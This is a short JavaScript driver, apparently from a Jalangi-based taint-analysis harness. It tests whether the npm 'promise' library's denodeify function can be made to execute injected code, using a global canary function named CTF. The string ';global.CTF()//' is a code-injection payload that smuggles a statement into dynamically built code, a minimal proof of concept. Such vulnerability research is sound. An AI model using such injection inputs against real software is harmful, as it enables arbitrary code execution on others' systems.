// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/promise/node_modules/promise');
global.CTF = function() {console.log("GLOBAL.CTF HIT")}
try {
	var x0 = ";global.CTF()//";
var x1 = {};
new PUT["denodeify"](x0,x1)();
} catch (e) {
	console.log(e);
}